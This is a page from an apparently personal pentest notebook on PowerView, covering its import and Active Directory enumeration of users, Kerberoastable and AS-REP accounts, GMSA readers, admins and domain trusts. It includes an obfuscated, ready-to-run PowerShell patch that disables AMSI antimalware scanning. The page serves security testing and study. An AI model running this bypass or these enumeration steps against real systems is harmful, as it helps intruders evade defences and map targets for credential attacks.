
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>PowerView Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="Powershell.html" />
    
    
    <link rel="prev" href="Hydra.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <a target="_blank" href="https://twitter.com/OtterHacker">
            
                    
                    Follow On Twitter
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <span>
            
                    
                    Articles
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../../Articles/Articles.html">
            
                <a href="../../Articles/Articles.html">
            
                    
                    Index
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../../Articles/Defcon31.html">
            
                <a href="../../Articles/Defcon31.html">
            
                    
                    Defcon advices
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" >
            
                <span>
            
                    
                    Malware
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" >
            
                <span>
            
                    
                    Docs
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1.1" data-path="../../Malware/Docs/Code snippet.html">
            
                <a href="../../Malware/Docs/Code snippet.html">
            
                    
                    Code Snippet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.2" data-path="../../Malware/Docs/Dumpbin.html">
            
                <a href="../../Malware/Docs/Dumpbin.html">
            
                    
                    Dumpbin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.3" data-path="../../Malware/Docs/NTStructure.html">
            
                <a href="../../Malware/Docs/NTStructure.html">
            
                    
                    NTStructure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.4" data-path="../../Malware/Docs/Passing arguments.html">
            
                <a href="../../Malware/Docs/Passing arguments.html">
            
                    
                    Passing Arguments
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2" >
            
                <span>
            
                    
                    Basics
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.1" data-path="../../Malware/Introduction/0 - Introduction.html">
            
                <a href="../../Malware/Introduction/0 - Introduction.html">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.2" data-path="../../Malware/Introduction/1 - PE.html">
            
                <a href="../../Malware/Introduction/1 - PE.html">
            
                    
                    PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3" data-path="../../Malware/Introduction/2 - Payload Storage.html">
            
                <a href="../../Malware/Introduction/2 - Payload Storage.html">
            
                    
                    Payload Storage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4" data-path="../../Malware/Introduction/3 - Payload Encryption.html">
            
                <a href="../../Malware/Introduction/3 - Payload Encryption.html">
            
                    
                    Payload Encryption
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.5" data-path="../../Malware/Introduction/4 - Function Call Obfuscation.html">
            
                <a href="../../Malware/Introduction/4 - Function Call Obfuscation.html">
            
                    
                    Function Call Obfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.6" data-path="../../Formation/RTO - Malware Development/5 - Backdooring PE.md">
            
                <span>
            
                    
                    Backdooring PE
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.3" >
            
                <span>
            
                    
                    EDR
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.3.1" data-path="../../Malware/EDR/TrendMicro.html">
            
                <a href="../../Malware/EDR/TrendMicro.html">
            
                    
                    TrendMicro
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3.2" data-path="../../Malware/EDR/Elastic EDR.html">
            
                <a href="../../Malware/EDR/Elastic EDR.html">
            
                    
                    Elastic EDR
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.4.1" data-path="../../Malware/CoffLoader.html">
            
                <a href="../../Malware/CoffLoader.html">
            
                    
                    COFF Loader
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.2" data-path="../../Malware/ETW.html">
            
                <a href="../../Malware/ETW.html">
            
                    
                    ETW
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.3" data-path="../../Malware/Function hooking.html">
            
                <a href="../../Malware/Function hooking.html">
            
                    
                    Function Hooking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.4" data-path="../../Malware/Kernel callback.html">
            
                <a href="../../Malware/Kernel callback.html">
            
                    
                    Kernel Callback
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.5" data-path="../../Malware/Module stomping.html">
            
                <a href="../../Malware/Module stomping.html">
            
                    
                    Module Stomping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.6" data-path="../../Malware/Remote DLL Injection.html">
            
                <a href="../../Malware/Remote DLL Injection.html">
            
                    
                    Remote DLL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.7" data-path="../../Malware/Reflective DLL injection.html">
            
                <a href="../../Malware/Reflective DLL injection.html">
            
                    
                    Reflective DLL Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.5" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.5.1" data-path="../../Malware/Docs/Tools/IDA.html">
            
                <a href="../../Malware/Docs/Tools/IDA.html">
            
                    
                    IDA
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5.2" data-path="../../Malware/Docs/Tools/Radare2.html">
            
                <a href="../../Malware/Docs/Tools/Radare2.html">
            
                    
                    R2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" >
            
                <span>
            
                    
                    Pentest
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" >
            
                <span>
            
                    
                    Cloud
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1.1" data-path="../Cloud/Azure.html">
            
                <a href="../Cloud/Azure.html">
            
                    
                    Azure
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.2" >
            
                <span>
            
                    
                    Configuration Review
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.2.1" data-path="../Configuration review/Database.html">
            
                <a href="../Configuration review/Database.html">
            
                    
                    Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2.2" data-path="../Configuration review/Kubernetes.html">
            
                <a href="../Configuration review/Kubernetes.html">
            
                    
                    Kubernetes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2.3" data-path="../Configuration review/KubernetesCIS.html">
            
                <a href="../Configuration review/KubernetesCIS.html">
            
                    
                    KubernetesCIS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.3" >
            
                <span>
            
                    
                    Services
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.3.1" data-path="../Services/AD.html">
            
                <a href="../Services/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.2" >
            
                <span>
            
                    
                    Databases
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.3.2.1" data-path="../Services/Oracle database.html">
            
                <a href="../Services/Oracle database.html">
            
                    
                    Oracle Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.2.2" data-path="../Services/MSSQL.html">
            
                <a href="../Services/MSSQL.html">
            
                    
                    MSSQL
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.3.3" data-path="../Services/DNS.html">
            
                <a href="../Services/DNS.html">
            
                    
                    DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.4" data-path="../Services/IPMI.html">
            
                <a href="../Services/IPMI.html">
            
                    
                    IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.5" data-path="../Services/Kerberos.html">
            
                <a href="../Services/Kerberos.html">
            
                    
                    Kerberos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.6" data-path="../Services/LDAP.html">
            
                <a href="../Services/LDAP.html">
            
                    
                    LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.7" data-path="../Services/Memcached.html">
            
                <a href="../Services/Memcached.html">
            
                    
                    Memcached
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.8" data-path="../Services/NFS.html">
            
                <a href="../Services/NFS.html">
            
                    
                    NFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.9" data-path="../Services/RPC.html">
            
                <a href="../Services/RPC.html">
            
                    
                    RPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.10" data-path="../Services/SMB.html">
            
                <a href="../Services/SMB.html">
            
                    
                    SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.11" data-path="../Services/SNMP.html">
            
                <a href="../Services/SNMP.html">
            
                    
                    SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.12" data-path="../Services/Tomcat.html">
            
                <a href="../Services/Tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3.13" data-path="../Services/WebDAV.html">
            
                <a href="../Services/WebDAV.html">
            
                    
                    WebDAV
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.4.1" data-path="../Techniques/ADCS abuses.html">
            
                <a href="../Techniques/ADCS abuses.html">
            
                    
                    Abuse ADCS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.2" data-path="../Techniques/Abuse tokens.html">
            
                <a href="../Techniques/Abuse tokens.html">
            
                    
                    Abuse Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.3" data-path="../Techniques/Trusts abuses.html">
            
                <a href="../Techniques/Trusts abuses.html">
            
                    
                    Abuse Trusts
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.4" data-path="../Techniques/Buffer overflow.html">
            
                <a href="../Techniques/Buffer overflow.html">
            
                    
                    Buffer Overflow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.5" data-path="../Techniques/Command injection.html">
            
                <a href="../Techniques/Command injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.6" data-path="../Techniques/Data exfiltration.html">
            
                <a href="../Techniques/Data exfiltration.html">
            
                    
                    Data Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.7" data-path="../Techniques/DPAPI.html">
            
                <a href="../Techniques/DPAPI.html">
            
                    
                    DPAPI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.8" data-path="../Techniques/Exploit handles.html">
            
                <a href="../Techniques/Exploit handles.html">
            
                    
                    Exploit handles
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.9" data-path="../Techniques/Filtering.html">
            
                <a href="../Techniques/Filtering.html">
            
                    
                    Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.10" data-path="../Techniques/Kioske escape.html">
            
                <a href="../Techniques/Kioske escape.html">
            
                    
                    Kioske Escape
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.11" data-path="../Techniques/LFI.html">
            
                <a href="../Techniques/LFI.html">
            
                    
                    LFI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.12" data-path="../Techniques/Password spraying.html">
            
                <a href="../Techniques/Password spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.13" data-path="../Techniques/Pivoting.html">
            
                <a href="../Techniques/Pivoting.html">
            
                    
                    Pivoting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.14" >
            
                <span>
            
                    
                    Privilege Escalation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.4.14.1" data-path="../Techniques/Privileges escalation/Windows.html">
            
                <a href="../Techniques/Privileges escalation/Windows.html">
            
                    
                    Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.14.2" data-path="../Techniques/Privileges escalation/Linux.html">
            
                <a href="../Techniques/Privileges escalation/Linux.html">
            
                    
                    Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.4.15" data-path="../Techniques/Reverse shell.html">
            
                <a href="../Techniques/Reverse shell.html">
            
                    
                    Reverse Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.16" data-path="../Techniques/Scrapping.md">
            
                <span>
            
                    
                    Scrapping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.17" data-path="../Techniques/Shellshock.html">
            
                <a href="../Techniques/Shellshock.html">
            
                    
                    Shellshock
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.18" data-path="../Techniques/SQL injection.html">
            
                <a href="../Techniques/SQL injection.html">
            
                    
                    SQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4.19" data-path="../Techniques/SSTI.html">
            
                <a href="../Techniques/SSTI.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.5" >
            
                <span>
            
                    
                    Technology
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.5.1" data-path="../Technology/AD.html">
            
                <a href="../Technology/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.2" data-path="../Technology/IOS.html">
            
                <a href="../Technology/IOS.html">
            
                    
                    IOS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.3" data-path="../Technology/NAC.html">
            
                <a href="../Technology/NAC.html">
            
                    
                    NAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.4" data-path="../Technology/Port Knocking.html">
            
                <a href="../Technology/Port Knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.5" data-path="../Technology/SAML.html">
            
                <a href="../Technology/SAML.html">
            
                    
                    SAML
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5.6" data-path="../Technology/SAP.html">
            
                <a href="../Technology/SAP.html">
            
                    
                    SAP
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5.6" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.6.1" data-path="BloundHound.html">
            
                <a href="BloundHound.html">
            
                    
                    BloundHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.2" data-path="CME.html">
            
                <a href="CME.html">
            
                    
                    CME
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.3" data-path="Curl.html">
            
                <a href="Curl.html">
            
                    
                    Curl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.4" data-path="Ffuf.html">
            
                <a href="Ffuf.html">
            
                    
                    FFUF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.5" data-path="Find.html">
            
                <a href="Find.html">
            
                    
                    Find
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.6" data-path="Hydra.html">
            
                <a href="Hydra.html">
            
                    
                    Hydra
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.6.7" data-path="PowerView.html">
            
                <a href="PowerView.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.8" data-path="Powershell.html">
            
                <a href="Powershell.html">
            
                    
                    Powershell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.9" data-path="Responder.html">
            
                <a href="Responder.html">
            
                    
                    Responder
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.10" data-path="Rubeus.html">
            
                <a href="Rubeus.html">
            
                    
                    Rubeus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.11" data-path="Strace.html">
            
                <a href="Strace.html">
            
                    
                    Strace
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6.12" data-path="Wfuzz.html">
            
                <a href="Wfuzz.html">
            
                    
                    Wfuzz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" >
            
                <span>
            
                    
                    Rainy Sunday
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../../Serveur/Proxmox/Intel Killer AX1650.html">
            
                <a href="../../Serveur/Proxmox/Intel Killer AX1650.html">
            
                    
                    Killer AX1650
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="../../Serveur/KMS/KMS.html">
            
                <a href="../../Serveur/KMS/KMS.html">
            
                    
                    KMS Activation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="../../Serveur/LicenceKey.html">
            
                <a href="../../Serveur/LicenceKey.html">
            
                    
                    Licence Key
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >PowerView</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="powerview">Powerview</h1>
<h1 id="table-of-content">Table of content</h1>
<!-- toc -->
<ul>
<li><a href="#import-powerview">Import PowerView</a></li>
<li><a href="#users-info">Users info</a><ul>
<li><a href="#domain-users">Domain users</a></li>
<li><a href="#spn-users">SPN users</a></li>
<li><a href="#gmsa-readpassword">GMSA ReadPassword</a></li>
<li><a href="#asrep-users">ASREP users</a></li>
<li><a href="#domain-admins">Domain admins</a></li>
</ul>
</li>
<li><a href="#domain-trust">Domain trust</a><ul>
<li><a href="#get-all-domain-trust">Get all domain trust</a></li>
<li><a href="#trusttype">TrustType:</a></li>
<li><a href="#trustattributes">TrustAttributes:</a></li>
<li><a href="#get-information-from-a-trusted-domain">Get information from a trusted domain</a></li>
<li><a href="#get-groups-with-user-from-other-domains">Get groups with user from other domains</a></li>
</ul>
</li>
<li><a href="#kerberoasting">Kerberoasting</a></li>
<li><a href="#dcsync">DCSync</a></li>
<li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
<li><a href="#users-that-can-modify-gpo">Users that can modify GPO</a></li>
<li><a href="#acl-on-users">ACL on users</a></li>
<li><a href="#grant-dcsync">Grant DCSync</a></li>
<li><a href="#ressource">Ressource</a></li>
</ul>
<!-- tocstop -->
<h1 id="import-powerview">Import PowerView</h1>
<p>The <code>Execution policy</code> must be set to <code>ByPass</code></p>
<pre><code class="lang-powershell">Import-Module .\powerview.ps1
</code></pre>
<p>If there it is blocked by the AMSI, launch the following code before reimporting:</p>
<pre><code class="lang-powershell"><span class="hljs-comment">#Rasta-mouses Amsi-Scan-Buffer patch \n</span>
<span class="hljs-variable">$dpqmb</span> = @<span class="hljs-string">&quot;
using System;
using System.Runtime.InteropServices;
public class dpqmb {
    [DllImport(&quot;</span>kernel32<span class="hljs-string">&quot;)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(&quot;</span>kernel32<span class="hljs-string">&quot;)]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(&quot;</span>kernel32<span class="hljs-string">&quot;)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr bqvxfg, uint flNewProtect, out uint lpflOldProtect);
}
&quot;</span>@

Add-Type <span class="hljs-variable">$dpqmb</span>

<span class="hljs-variable">$shxnhxm</span> = [dpqmb]::LoadLibrary(<span class="hljs-string">&quot;$([CHaR]([bYtE]0x61)+[Char](109*80/80)+[chAr]([bYte]0x73)+[CHAR](57+48)+[chAR](46*12/12)+[cHAr]([Byte]0x64)+[ChaR]([BYtE]0x6c)+[chAR](55+53))&quot;</span>)
<span class="hljs-variable">$dewhnt</span> = [dpqmb]::GetProcAddress(<span class="hljs-variable">$shxnhxm</span>, <span class="hljs-string">&quot;$((&apos;&#xC0;ms&#xEE;Sc&#xE3;&apos;+&apos;nBuffer&apos;).NormALizE([ChAr](23+47)+[CHAR](111)+[CHAr]([BYTe]0x72)+[CHAr]([bYTe]0x6d)+[cHaR]([ByTE]0x44)) -replace [chaR]([BYte]0x5c)+[ChAr](42+70)+[Char](123*119/119)+[Char](77+31-31)+[chaR](3+107)+[cHAR]([bytE]0x7d))&quot;</span>)
<span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>
[dpqmb]::VirtualProtect(<span class="hljs-variable">$dewhnt</span>, [uint32]<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x40, [ref]<span class="hljs-variable">$p</span>)
<span class="hljs-variable">$jojn</span> = <span class="hljs-string">&quot;0xB8&quot;</span>
<span class="hljs-variable">$mbww</span> = <span class="hljs-string">&quot;0x57&quot;</span>
<span class="hljs-variable">$rjsu</span> = <span class="hljs-string">&quot;0x00&quot;</span>
<span class="hljs-variable">$bbnx</span> = <span class="hljs-string">&quot;0x07&quot;</span>
<span class="hljs-variable">$uxow</span> = <span class="hljs-string">&quot;0x80&quot;</span>
<span class="hljs-variable">$aask</span> = <span class="hljs-string">&quot;0xC3&quot;</span>
<span class="hljs-variable">$xmpmv</span> = [Byte[]] (<span class="hljs-variable">$jojn</span>,<span class="hljs-variable">$mbww</span>,<span class="hljs-variable">$rjsu</span>,<span class="hljs-variable">$bbnx</span>,+<span class="hljs-variable">$uxow</span>,+<span class="hljs-variable">$aask</span>)
[System.Runtime.InteropServices.Marshal]::Copy(<span class="hljs-variable">$xmpmv</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$dewhnt</span>, <span class="hljs-number">6</span>)
</code></pre>
<h1 id="users-info">Users info</h1>
<h2 id="domain-users">Domain users</h2>
<p>Dump all domain users</p>
<pre><code class="lang-powershell">Get-DomainUser -domain ${domain} -server ${dcIp}
</code></pre>
<h2 id="spn-users">SPN users</h2>
<p>Dump users with <code>SPN</code> that can be used in <code>Kerberoasting</code></p>
<pre><code class="lang-powershell">Get-DomainUser -SPN -domain ${domain} -server ${dcIp}
</code></pre>
<h2 id="gmsa-readpassword">GMSA ReadPassword</h2>
<p>Get list of users that can read <code>GMSA</code> passwords</p>
<pre><code class="lang-powershell">Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword | <span class="hljs-built_in">Where-Object</span>{<span class="hljs-variable">$_</span>[<span class="hljs-string">&quot;msDS-ManagedPassword&quot;</span>] <span class="hljs-nomarkup">-ne</span> <span class="hljs-string">&quot;&quot;</span>}
</code></pre>
<h2 id="asrep-users">ASREP users</h2>
<p>Dump users whose <code>Kerberos</code> tickets can be retrieved without domain account</p>
<pre><code class="lang-powershell">Get-DomainUser -PreauthNoRequired -domain ${domain} -server ${dcIp}
</code></pre>
<h2 id="domain-admins">Domain admins</h2>
<p>Dump domain admins users</p>
<pre><code class="lang-powershell">Get-DomainGroupMember -Identity <span class="hljs-string">&quot;Domain Admins&quot;</span> -Recurse -domain ${domain} -server ${dcIp}
</code></pre>
<h1 id="domain-trust">Domain trust</h1>
<h2 id="get-all-domain-trust">Get all domain trust</h2>
<p>It will display all trusted domain and the information about these trust links</p>
<pre><code class="lang-powershell">Get-DomainTrust -domain ${domain} -server ${dcIp}
</code></pre>
<h2 id="trusttype">TrustType:</h2>
<ul>
<li><code>DOWNLEVEL</code>/<code>WINDOWS_NON_ACTIVE_DIRECTORY</code> (0x00000001) : a trusted Windows domain that <code>IS NOT</code> running Active Directory.</li>
<li><code>UPLEVEL</code>/<code>WINDOWS_ACTIVE_DIRECTORY</code> (0x00000002) : a trusted Windows domain that <code>IS</code> running Active Directory.</li>
<li><code>MIT</code> (0x00000003) : a trusted domain that is running a non-Windows (*nix), <code>RFC4120</code>-compliant Kerberos distribution. This is labeled as <code>MIT</code> due to, well, MIT publishing <code>RFC4120</code>.</li>
</ul>
<h2 id="trustattributes">TrustAttributes:</h2>
<ul>
<li><code>NON_TRANSITIVE</code> (0x00000001) : the trust cannot be used transitively. That is, if <code>Domain A</code> trusts <code>Domain B</code> and <code>Domain B</code> trusts <code>Domain C</code>, then <code>Domain A</code> does not automatically trust <code>Domain C</code>. Also, if a trust is non-transitive, then you will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive.</li>
<li><code>UPLEVEL_ONLY</code> (0x00000002) : only <code>Windows 2000</code> operating system and newer clients can use the trust.</li>
<li><code>QUARANTINED_DOMAIN</code>/<code>FILTER_SID</code> (0x00000004) : <code>SID</code> filtering is enabled.</li>
<li><code>FOREST_TRANSITIVE</code> (0x00000008) : cross-forest trust between the root of two domain forests running at least domain functional level 2003 or above.</li>
<li><code>CROSS_ORGANIZATION</code> (0x00000010) : the trust is to a domain or forest that is not part of the organization, which adds the <code>OTHER_ORGANIZATION SID</code>. This is a bit of a weird one. I don&apos;t remember encountering this flag in the field, but according to this post it means that the selective authentication security protection is enabled. For more information, check out <a href="https://imav8n.wordpress.com/2008/07/30/trust-attribute-cross_organization-and-selective-auth/" target="_blank">this</a> MSDN doc.</li>
<li><code>WITHIN_FOREST</code> (0x00000020) : the trusted domain is within the same forest, meaning a <code>parent-&gt;child</code> or <code>cross-link</code> relationship</li>
<li><code>TREAT_AS_EXTERNAL</code> (0x00000040) : the trust is to be treated as external for trust boundary purposes. According to the documentation, &quot;<em>If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering. Cross-forest trusts are more stringently filtered than external trusts. This attribute relaxes those cross-forest trusts to be equivalent to external trusts.&quot;</em> This sounds enticing, and I&apos;m not 100% sure on the security implications of this statement.</li>
<li><code>USES_RC4_ENCRYPTION</code> (0x00000080) : if the <code>TrustType</code> is <code>MIT</code>, specifies that the trust that supports <code>RC4</code> keys.</li>
<li><code>USES_AES_KEYS</code> (0x00000100) : not listed in the linked <code>Microsoft</code> documentation, but according to some documentation I&apos;ve been able to find online, it specifies that <code>AES</code> keys are used to encrypt <code>KRB TGTs</code>.</li>
<li><code>CROSS_ORGANIZATION_NO_TGT_DELEGATION</code> (0x00000200) : &quot;<em>If this bit is set, tickets granted under this trust MUST NOT be trusted for delegation.</em>&quot; This is described more in <code>MS-KILE 3.3.5.7.5 (Cross-Domain Trust and Referrals)</code></li>
